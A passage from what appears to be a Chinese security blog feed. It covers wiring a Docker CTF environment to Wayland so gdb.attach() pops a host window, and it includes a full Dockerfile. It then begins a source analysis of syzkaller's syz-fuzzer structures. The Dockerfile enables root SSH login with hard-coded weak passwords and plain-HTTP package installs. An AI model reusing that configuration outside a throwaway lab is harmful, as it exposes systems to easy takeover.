无法更换硬盘的特性让笔者非常痛苦，但仔细想来还是老罗的那句名言——<code>又不是不能用</code>，硬盘空间想办法腾一腾多开好几个虚拟机其实没什么不好，毕竟省去了折腾 docker 的麻烦就一万个值，于是笔者日渐习惯每天在不同虚拟机之间跳来跳去</p><p><img src="https://s2.loli.net/2023/10/25/4nrEeVhf876YtAC.png" alt="你知道我要说什么.png"></p><p>不过这个问题并没有折磨笔者太长的时间，在玩了将近一个学期的用户态 Pwn 学了各种不同的 house 之后笔者感觉 glibc pwn 在技术上基本上已经玩不出什么新的有意思的花样了，于是选择了 all in Linux kernel pwn，只需要用 QEMU 去跑虚拟机，gdb 可以直接连上 QEMU 的端口进行调试，也不依赖于某些特定的 glibc 环境（虽然后面玩虚拟机逃逸又用到了不过这是后话了），于是当初搭建的几个用户态 Pwn 环境的虚拟机就慢慢用不到了， <em>现在已经被笔者逐一打包扔到备份硬盘当中</em></p><p>而在 2023 年的今天，笔者又想趁着闲暇时间再业余小玩一下用户态的 Pwn（比赛大概率不一定会专门打了，最多就看到 corCTF 这样的优质比赛会去做做他们的内核题，一些比较有意思的的用户态 Pwn 题最多可能赛后会复现之类的），那么环境以及各种 libc（包括 glibc 、tclibc、musl，<del>👴其实没想明白 musl 为啥会在 CTF 里流行起来，是没活了🐎</del>）又重新变为笔者需要面对的问题之一，而彼时同时跑好几个虚拟机的解决方案未免太过于小丑🤡，因此笔者决定找到一个能够在 docker 当中执行 <code>gdb.attach()</code> 时直接在宿主机中弹出一个窗口的办法</p><blockquote><p>写了这么多没用的批话，突然感觉这一篇其实应该放到 <a href="https://arttnba3.cn/categories/PIECES/">PIECES</a> 分类 而非 <a href="https://arttnba3.cn/categories/OPS/">OPS</a> ，但仔细想想其实笔者真正要讲的核心内容其实是 docker 的一个小知识，所以还是放 OPS 分类下或许会更加合适一些</p></blockquote><h1 id="0x01-为-Docker-接入-Wayland-环境"><a href="#0x01-为-Docker-接入-Wayland-环境" class="headerlink" title="0x01. 为 Docker 接入 Wayland 环境"></a>0x01. 为 Docker 接入 Wayland 环境</h1><blockquote><p>笔者所用的图形服务为 Wayland，因此本篇不会讲 X11 该怎么配置（毕竟已经有很多讲这个的<a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">文章</a>了，<del>，以及都什么年代了还在用传统图形服务</del>）</p></blockquote><p>配置的办法其实很简单，我们只需要在启动容器时额外添加一些参数即可，下面是一个简单的例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu20 .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d -p <span class="hljs-string">&quot;2222:22&quot;</span> \</span><br><span class="language-bash">--name=pwnenv_ubuntu20 \</span><br><span class="language-bash">-e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">-e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">-e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">-e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">pwnenv_ubuntu20</span><br></code></pre></td></tr></table></figure><blockquote><p><del>别问👴这些参数是什么意思，自己查嗷</del></p></blockquote><p>启动之后容器其实就完成对 Wayland 服务的接入了，这里我们简单写一个 QT 小程序看看实力：</p><p><img src="https://s2.loli.net/2023/10/25/bsER7NLVfD3Oq28.png" alt="libEGL 的报错懒得管了，反正日常使用没啥影响"></p><p>现在我们的 docker 就已经成功接入 Host 侧的图形服务了：）</p><h1 id="0x02-让-gdb-attach-弹出一个新的图形窗口"><a href="#0x02-让-gdb-attach-弹出一个新的图形窗口" class="headerlink" title="0x02. 让 gdb.attach() 弹出一个新的图形窗口"></a>0x02. 让 gdb.attach() 弹出一个新的图形窗口</h1><p>这个其实也很简单，笔者用的是 KDE 桌面，所以先在容器里装一个 <code>konsole</code> ，如果你用的是 Gnome 则可以装个 <code>gnome-terminal</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install konsole</span><br></code></pre></td></tr></table></figure><p>之后在 pwntools 调用 gdb 之前将全局变量 <code>context.terminal</code> 的值设为如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br></code></pre></td></tr></table></figure><p>之后就能像调试本地原生进程那样在调试 docker 里的进程的时候弹出一个新的 gdb 图形窗口了 ：）</p><p><img src="https://s2.loli.net/2023/10/25/fKS5bQUizjakCAr.jpg" alt="yattaze"></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF. What’s more…"></a>0xFF. What’s more…</h1><p>最后给出一个笔者自用的开箱即用的 docker pwn 环境的 Dockerfile，有需要的可以自取：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:root123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone \</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这一日，Docker 再入桌面 GUI 境界&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
    <category term="GUI" scheme="https://arttnba3.github.io/tags/GUI/"/>
    
    <category term="Wayland" scheme="https://arttnba3.github.io/tags/Wayland/"/>
    
  </entry>
  
  <entry>
    <title>【FUZZ.0x03】syzkaller - III：syz-fuzzer 源码分析</title>
    <link href="https://arttnba3.github.io/2023/09/27/FUZZ-0X03-SYZKALLER-III_SOURCE_SYZFUZZER/"/>
    <id>https://arttnba3.github.io/2023/09/27/FUZZ-0X03-SYZKALLER-III_SOURCE_SYZFUZZER/</id>
    <published>2023-09-26T15:26:14.000Z</published>
    <updated>2023-09-26T17:45:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>（摘下眼镜）Furry？（戴上眼镜）Fuzzer！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>在<a href="https://arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/">上一篇文章</a>当中我们分析了 syzkaller 三大组件当中的 syz-manager 的源码，本篇文章我们继续来分析 syz-fuzzer 的源码</p><p>与 syz-manager 所不同的是，syz-fuzzer 位于 Guest VM 当中，<strong>本质上涵盖了一个传统 fuzzer 的所有基本功能</strong>：输入生成与变异、启动新进程（syz-executor）执行输入、获取覆盖率信息…</p><p>在 syz-fuzzer 运行过程中其会通过 RPC 调用 syz-manager 中的部分函数，因此本篇也会分析上篇所未涉及到的 syz-manager 中的一些函数：）</p><blockquote><p>这一系列文章确实鸽了挺久了，但最近确实是比较忙没啥时间写博客（这一篇其实之前大致的初稿就写好了，但是后面又鸽掉了…），不知道下一篇会是什么时候了 XD</p></blockquote><h1 id="0x01-基本结构体"><a href="#0x01-基本结构体" class="headerlink" title="0x01. 基本结构体"></a>0x01. 基本结构体</h1><p>相比于直接开始一头雾水地分析源码，笔者认为还是有必要在此之前先列出一些基本的结构体，你也可以把这一节当成一个表来查 ：）</p><h2 id="Fuzzing-过程相关"><a href="#Fuzzing-过程相关" class="headerlink" title="Fuzzing 过程相关"></a>Fuzzing 过程相关</h2><h3 id="1-Syscall：单个系统调用的基本信息"><a href="#1-Syscall：单个系统调用的基本信息" class="headerlink" title="1. Syscall：单个系统调用的基本信息"></a>1. Syscall：单个系统调用的基本信息</h3><p>syzkaller <strong>以系统调用为基本输入单位</strong>，定义于 <code>prog/types.go</code> 中的 <code>Syscall</code> 结构体被用来表示单个系统调用的基本信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Syscall <span class="hljs-keyword">struct</span> &#123;<br>ID          <span class="hljs-type">int</span><br>NR          <span class="hljs-type">uint64</span> <span class="hljs-comment">// kernel syscall number</span><br>Name        <span class="hljs-type">string</span><br>CallName    <span class="hljs-type">string</span><br>MissingArgs <span class="hljs-type">int</span> <span class="hljs-comment">// number of trailing args that should be zero-filled</span><br>Args        []Field<br>Ret         Type<br>Attrs       SyscallAttrs<br><br>inputResources  []*ResourceDesc<br>outputResources []*ResourceDesc<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们编写 syzlang 文件时，我们可以为系统调用<a href="https://arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/#call-attributes">添加一些属性</a>，这被封装于内嵌在 <code>Syscall</code> 里的 <code>SyscallAttrs</code> 结构体中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// SyscallAttrs 表示 syzlang 的调用属性.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 该结构为系统所有其他部分的 source of truth.</span><br><span class="hljs-comment">// pkg/compiler 使用该结构对描述进行语法分析.</span><br><span class="hljs-comment">// syz-sysgen 使用该结构为 executor 生成代码.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 目前仅支持 `bool`s 与 `uint64`s.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 对于独立属性的描述，参见 docs/syscall_descriptions_syntax.md </span><br><span class="hljs-keyword">type</span> SyscallAttrs <span class="hljs-keyword">struct</span> &#123;<br>Disabled      <span class="hljs-type">bool</span><br>Timeout       <span class="hljs-type">uint64</span><br>ProgTimeout   <span class="hljs-type">uint64</span><br>IgnoreReturn  <span class="hljs-type">bool</span><br>BreaksReturns <span class="hljs-type">bool</span><br>NoGenerate    <span class="hljs-type">bool</span><br>NoMinimize    <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ChoiceTable：系统调用生成优先级表"><a href="#2-ChoiceTable：系统调用生成优先级表" class="headerlink" title="2. ChoiceTable：系统调用生成优先级表"></a>2. ChoiceTable：系统调用生成优先级表</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>ChoiceTable</code> 是 syz-fuzzer 中非常核心的一个结构，其用于表示<strong>对于给定的系统调用 x，在添加入系统调用 y 后，代码覆盖率会上升的可能性</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ChooseTable（译注：原文如此）允许对给定的一个系统调用，</span><br><span class="hljs-comment">// 对一个系统调用进行一次权重选择，这基于调用到调用的优先级与开启&amp;可生成的系统调用集合</span><br><span class="hljs-keyword">type</span> ChoiceTable <span class="hljs-keyword">struct</span> &#123;<br>target          *Target<span class="hljs-comment">/* 目标架构信息 */</span><br>runs            [][]<span class="hljs-type">int32</span> <span class="hljs-comment">/* 优先级表 */</span><br>calls           []*Syscall <span class="hljs-comment">/* 系统调用信息 */</span><br>noGenerateCalls <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>  <span class="hljs-comment">/* 不用于输入生成的系统调用号 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>优先级权重值存放在二维数组 <code>run</code> 中，需要注意的是这个优先级为<strong>累加值</strong>，例如有给定的三个系统调用 A、B、C，有这样的一个生成优先级表 <code>prios</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>那么在 <code>run</code> 表中则会将一列的结果逐个加起来，从而有这样的一个结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>为什么要这么做笔者也不知道 ：(</p><h3 id="3-weights：权重"><a href="#3-weights：权重" class="headerlink" title="3. weights：权重"></a>3. weights：权重</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>weights</code> 结构体用于表示【目标系统调用的权重】：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> weights <span class="hljs-keyword">struct</span> &#123;<br>call  <span class="hljs-type">int</span> <span class="hljs-comment">/* 系统调用号 */</span><br>in    <span class="hljs-type">int32</span>  <span class="hljs-comment">/* 以该系统调用作为输入的权重值？ */</span><br>inout <span class="hljs-type">int32</span>  <span class="hljs-comment">/* 以该系统调用作为输出的权重值？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Call：用作输入的单个系统调用"><a href="#4-Call：用作输入的单个系统调用" class="headerlink" title="4. Call：用作输入的单个系统调用"></a>4. Call：用作输入的单个系统调用</h3><p>syzkaller 的 fuzzing 以 syscall 为单位，<code>Syscall</code> 结构体用于表示单个系统调用的基本信息，<code>Call</code> 结构体则表示<strong>带有参数的一个系统调用</strong>，是 syzkaller 中所谓的最小输入单位</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Call <span class="hljs-keyword">struct</span> &#123;<br>Meta    *Syscall<br>Args    []Arg<br>Ret     *ResultArg<br>Props   CallProps<br>Comment <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ArgCtx：带上下文的参数"><a href="#5-ArgCtx：带上下文的参数" class="headerlink" title="5. ArgCtx：带上下文的参数"></a>5. ArgCtx：带上下文的参数</h3><p>系统调用的参数用 <code>Arg</code> 接口表示， <code>ArgCtx</code> 为实现了该接口的带有上下文的一个参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ArgCtx <span class="hljs-keyword">struct</span> &#123;<br>Parent *[]Arg      <span class="hljs-comment">// GroupArg.Inner (for structs) or Call.Args containing this arg.</span><br>Fields []Field     <span class="hljs-comment">// Fields of the parent struct/syscall.</span><br>Base   *PointerArg <span class="hljs-comment">// Pointer to the base of the heap object containing this arg.</span><br>Offset <span class="hljs-type">uint64</span>      <span class="hljs-comment">// Offset of this arg from the base.</span><br>Stop   <span class="hljs-type">bool</span>        <span class="hljs-comment">// If set by the callback, subargs of this arg are not visited.</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-Prog：单个输入程序"><a href="#6-Prog：单个输入程序" class="headerlink" title="6. Prog：单个输入程序"></a>6. Prog：单个输入程序</h3><p>通常情况下我们并不仅以一个系统调用作为输入，而是以<strong>一组系统调用序列</strong>作为输入单位——即一个<strong>程序</strong>，这也是 syzkaller 中<strong>实质上的最小输入单位</strong>，在 syz-fuzzer 当中使用 <code>Prog</code> 结构体来表示<strong>单个输入</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Prog <span class="hljs-keyword">struct</span> &#123;<br>Target   *Target <span class="hljs-comment">/* 目标架构信息 */</span><br>Calls    []*Call <span class="hljs-comment">/* 系统调用序列 */</span><br>Comments []<span class="hljs-type">string</span>  <span class="hljs-comment">/* 注释？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-Candidate：序列化的单个输入项"><a href="#6-Candidate：序列化的单个输入项" class="headerlink" title="6. Candidate：序列化的单个输入项"></a>6. Candidate：序列化的单个输入项</h3><p>我们通常会有多个 syz-fuzzer 进程与 VM，而我们更希望<strong>在 fuzzer 之间共享那些有用的输入</strong>，这通常通过 <code>syz-fuzzer</code> 向 <code>syz-manager</code> 发起 RPC <code>poll()</code> 来完成——<code>candidate</code> 用以表示<strong>序列化后的输入</strong>，从而方便在不同 进程间传递：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Candidate <span class="hljs-keyword">struct</span> &#123;<br>Prog      []<span class="hljs-type">byte</span><span class="hljs-comment">/* 序列化后的程序 */</span><br>Minimized <span class="hljs-type">bool</span><span class="hljs-comment">/* 是否最小化？ */</span><br>Smashed   <span class="hljs-type">bool</span><span class="hljs-comment">/* 是否要打碎重组？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-CallInfo：单个系统调用的运行结果"><a href="#7-CallInfo：单个系统调用的运行结果" class="headerlink" title="7. CallInfo：单个系统调用的运行结果"></a>7. CallInfo：单个系统调用的运行结果</h3><p>执行完程序之后我们自然想要知道程序的执行结果，在 syz-fuzzer 当中使用 <code>CallInfo</code> 结构体表示<strong>单个系统调用的执行结果</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> CallInfo <span class="hljs-keyword">struct</span> &#123;<br>Flags  CallFlags<br>Signal []<span class="hljs-type">uint32</span> <span class="hljs-comment">// 反馈信号, 若设置了 FlagSignal 则填充</span><br>Cover  []<span class="hljs-type">uint32</span> <span class="hljs-comment">// 每个系统调用的覆盖率, 若设置了 FlagSignal 且 cover == true 则填充,</span><br><span class="hljs-comment">// if dedup == false, 则 cov 实际上包含了一个 trace, 否则重复项被删除</span><br>Comps prog.CompMap <span class="hljs-comment">// 每个系统调用的比较操作数</span><br>Errno <span class="hljs-type">int</span>          <span class="hljs-comment">// 调用的 errno (若调用成功则为 0)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>CompMap</code> 为一个二重映射 <code>uint64 → 【uint64 → bool】</code> ，我们将在后文解释这个东西：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Example: for comparisons &#123;(op1, op2), (op1, op3), (op1, op4), (op2, op1)&#125;</span><br><span class="hljs-comment">// this map will store the following:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//m = &#123;</span><br><span class="hljs-comment">//op1: &#123;map[op2]: true, map[op3]: true, map[op4]: true&#125;,</span><br><span class="hljs-comment">//op2: &#123;map[op1]: true&#125;</span><br><span class="hljs-comment">//&#125;.</span><br><span class="hljs-keyword">type</span> CompMap <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><h3 id="8-ProgInfo：单个程序的运行结果"><a href="#8-ProgInfo：单个程序的运行结果" class="headerlink" title="8. ProgInfo：单个程序的运行结果"></a>8. ProgInfo：单个程序的运行结果</h3><p>syzkaller 中单次运行的最小粒度其实是由一组系统调用构成的一个程序，因此程序的运行结果很自然地就是由一组 <code>CallInfo</code> 构成：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ProgInfo <span class="hljs-keyword">struct</span> &#123;<br>Calls []CallInfo<br>Extra CallInfo <span class="hljs-comment">// stores Signal and Cover collected from background threads</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-Env：syz-executor-的执行环境信息"><a href="#9-Env：syz-executor-的执行环境信息" class="headerlink" title="9. Env：syz-executor 的执行环境信息"></a>9. Env：syz-executor 的执行环境信息</h3><p> <code>Env</code> 结构体用来记录 syz-executor 的执行环境信息，如输入、输出、执行的命令行等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br>in  []<span class="hljs-type">byte</span><br>out []<span class="hljs-type">byte</span><br><br>cmd       *command<br>inFile    *os.File<br>outFile   *os.File<br>bin       []<span class="hljs-type">string</span><br>linkedBin <span class="hljs-type">string</span><br>pid       <span 